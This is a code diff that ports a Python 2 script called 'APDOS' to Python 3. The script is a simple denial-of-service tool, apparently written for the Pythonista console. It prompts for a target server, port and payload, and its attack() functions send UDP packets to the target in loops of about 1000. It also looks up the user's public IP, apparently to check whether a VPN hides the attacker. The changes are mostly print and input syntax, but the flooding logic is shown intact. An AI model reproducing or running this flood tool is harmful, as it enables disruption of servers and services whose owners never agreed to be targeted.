@@ -4,18 +4,18 @@ console.set_color()
 if len(sys.argv) > 1:
 	pass
 else:
-	print ""
-	print "      -+--=:=-  -+-  -=:=--+-"
+	print("")
+	print("      -+--=:=-  -+-  -=:=--+-")
 	console.set_color(0, 130, 0)
-	print "        Please Set sys.argv"
+	print("        Please Set sys.argv")
 	console.set_color()
-	print "      -+--=:=-  -+-  -=:=--+-"
+	print("      -+--=:=-  -+-  -=:=--+-")
 	console.set_color(0, 130, 0)
-	print "               Usage"
-	print "        <Strength> <Colour>"
+	print("               Usage")
+	print("        <Strength> <Colour>")
 	console.set_color()
-	print "      -+--=:=-  -+-  -=:=--+-"
-	print ""
+	print("      -+--=:=-  -+-  -=:=--+-")
+	print("")
 	sys.exit()
 if sys.argv[2] == "blue":
 	color = "blue"
@@ -32,7 +32,7 @@ if sys.argv[2] == "sexy":
 if int(sys.argv[1]) <= 2:
 	import thelogo
 console.set_font('System-Bold', 15)
-print "###################################"
+print("###################################")
 try:
 	if color == "blue":
 		console.set_color(0, 0, 130)
@@ -48,28 +48,28 @@ try:
 		console.set_color(0, 130, 0)
 except:
 	console.set_color(130, 0, 0)
-print "     _    ____  ____   ___  ____ "
-print "    / \  |  _ \|  _ \ / _ \/ ___|"
-print "   / _ \ | |_) | | | | | | \___ \ "
-print "  / ___ \|  __/| |_| | |_| |___) )"
-print " /_/   \_\_|   |____/ \___/|____/ "
-print ""
+print("     _    ____  ____   ___  ____ ")
+print("    / \  |  _ \|  _ \ / _ \/ ___|")
+print("   / _ \ | |_) | | | | | | \___ \ ")
+print("  / ___ \|  __/| |_| | |_| |___) )")
+print(" /_/   \_\_|   |____/ \___/|____/ ")
+print("")
 console.set_color()
-print "###################################"
-print ""
+print("###################################")
+print("")
 console.set_font()
-print "     -=-+- -+-=-  -=-+- -+-=-"
+print("     -=-+- -+-=-  -=-+- -+-=-")
 console.set_font('AmericanTypewriter', 15)
-print " " * 29 + "- APDOS -"
+print(" " * 29 + "- APDOS -")
 console.set_font()
-print "     -=-+- -+-=-  -=-+- -+-=-"
-print "     -+-=-    Version   -=-+-"
-print "     -+-=-     GREAT    -=-+-"
-print "     -+-=-    OKAYISH   -=-+-"
-print "     -+-=-   FEEDBACKS  -=-+-"
-print "     -=-+- -+-=-  -=-+- -+-=-"
-version = raw_input("     -+-=- ")
-print "     -=-+- -+-=-  -=-+- -+-=-\n"
+print("     -=-+- -+-=-  -=-+- -+-=-")
+print("     -+-=-    Version   -=-+-")
+print("     -+-=-     GREAT    -=-+-")
+print("     -+-=-    OKAYISH   -=-+-")
+print("     -+-=-   FEEDBACKS  -=-+-")
+print("     -=-+- -+-=-  -=-+- -+-=-")
+version = input("     -+-=- ")
+print("     -=-+- -+-=-  -=-+- -+-=-\n")
 time.sleep(1)
 try:
 	if color == "blue":
@@ -86,9 +86,9 @@ try:
 		console.set_color(0, 130, 0)
 except:
 	console.set_color(130, 0, 0)
-server = raw_input("[ ] SERVER: ")
-port = raw_input("[ ] PORT: ")
-type = raw_input("[ ] PAYLOAD: ")
+server = input("[ ] SERVER: ")
+port = input("[ ] PORT: ")
+type = input("[ ] PAYLOAD: ")
 console.set_color()
 if port == '':
 	port = 80
@@ -112,10 +112,10 @@ if type == "skip":
 				console.set_color(0, 130, 0)
 		except:
 			console.set_color(130, 0, 0)
-		print ""
-		print "      -=-+- -+-=-  -=-+- -+-=-"
-		print "         - APDOS COMPLETE -   "
-		print "      -=-+- -+-=-  -=-+- -+-=-"
+		print("")
+		print("      -=-+- -+-=-  -=-+- -+-=-")
+		print("         - APDOS COMPLETE -   ")
+		print("      -=-+- -+-=-  -=-+- -+-=-")
 		console.set_color()
 		quit()
 	def feed():
@@ -136,10 +136,10 @@ if type == "skip":
 				console.set_color(0, 130, 0)
 		except:
 			console.set_color(130, 0, 0)
-		print ""
-		print "      -=-+- -+-=-  -=-+- -+-=-"
-		print "         - APDOS COMPLETE -   "
-		print "      -=-+- -+-=-  -=-+- -+-=-"
+		print("")
+		print("      -=-+- -+-=-  -=-+- -+-=-")
+		print("         - APDOS COMPLETE -   ")
+		print("      -=-+- -+-=-  -=-+- -+-=-")
 		console.set_color()
 		quit()
 	if (version == "GREAT"):
@@ -161,8 +161,8 @@ if type == "skip":
 	def attack():
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
 		s.sendto(type, (server, int(port)))
-		print "Data: " + type
-		print "Server: " + server + ":" + port
+		print("Data: " + type)
+		print("Server: " + server + ":" + port)
 		s.close()
 	for i in range(1, 1000):
 		attack()
@@ -182,15 +182,15 @@ if type == "skip":
 				console.set_color(0, 130, 0)
 	except:
 		console.set_color(130, 0, 0)
-	print ""
-	print "      -=-+- -+-=-  -=-+- -+-=-"
-	print "         - APDOS COMPLETE -   "
-	print "      -=-+- -+-=-  -=-+- -+-=-"
+	print("")
+	print("      -=-+- -+-=-  -=-+- -+-=-")
+	print("         - APDOS COMPLETE -   ")
+	print("      -=-+- -+-=-  -=-+- -+-=-")
 	console.set_color()
 	sys.exit()
-print ""
-print "-+--=- " + server  + " -=--+-\n"
-print "-+--=- " + type + " -=--+-"
+print("")
+print("-+--=- " + server  + " -=--+-\n")
+print("-+--=- " + type + " -=--+-")
 done = False
 def animate():
 	for c in itertools.cycle(['|', '/', '-', '\\']):
@@ -265,7 +265,7 @@ def animate():
 		sys.stdout.flush()
 		time.sleep(0.1)
 	try:
-		from urllib2 import urlopen
+		from urllib.request import urlopen
 		myip = urlopen('http://ip.42.pl/raw').read()
 		hname = socket.gethostbyaddr(myip)
 		vpn = "[NO]"
@@ -335,10 +335,10 @@ def udp():
 				console.set_color(0, 130, 0)
 	except:
 		console.set_color(130, 0, 0)
-	print ""
-	print "      -=-+- -+-=-  -=-+- -+-=-"
-	print "         - APDOS COMPLETE -   "
-	print "      -=-+- -+-=-  -=-+- -+-=-"
+	print("")
+	print("      -=-+- -+-=-  -=-+- -+-=-")
+	print("         - APDOS COMPLETE -   ")
+	print("      -=-+- -+-=-  -=-+- -+-=-")
 	console.set_color()
 	quit()
 def feed():
@@ -359,10 +359,10 @@ def feed():
 				console.set_color(0, 130, 0)
 	except:
 		console.set_color(130, 0, 0)
-	print ""
-	print "      -=-+- -+-=-  -=-+- -+-=-"
-	print "         - APDOS COMPLETE -   "
-	print "      -=-+- -+-=-  -=-+- -+-=-"
+	print("")
+	print("      -=-+- -+-=-  -=-+- -+-=-")
+	print("         - APDOS COMPLETE -   ")
+	print("      -=-+- -+-=-  -=-+- -+-=-")
 	console.set_color()
 	quit()
 if (version == "GREAT"):
@@ -385,8 +385,8 @@ def attack():
 	type = "0x7392a88716b"
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
 	s.sendto(type, (server, int(port)))
-	print "Data: " + type
-	print "Server: " + server + ":" + port
+	print("Data: " + type)
+	print("Server: " + server + ":" + port)
 	s.close()
 for i in range(1, 1000):
 	attack()
@@ -405,9 +405,10 @@ try:
 		console.set_color(0, 130, 0)
 except:
 	console.set_color(130, 0, 0)
-print ""
-print "      -=-+- -+-=-  -=-+- -+-=-"
-print "         - APDOS COMPLETE -   "
-print "      -=-+- -+-=-  -=-+- -+-=-"
+print("")
+print("      -=-+- -+-=-  -=-+- -+-=-")
+print("         - APDOS COMPLETE -   ")
+print("      -=-+- -+-=-  -=-+- -+-=-")
 console.set_color()
 sys.exit()
+
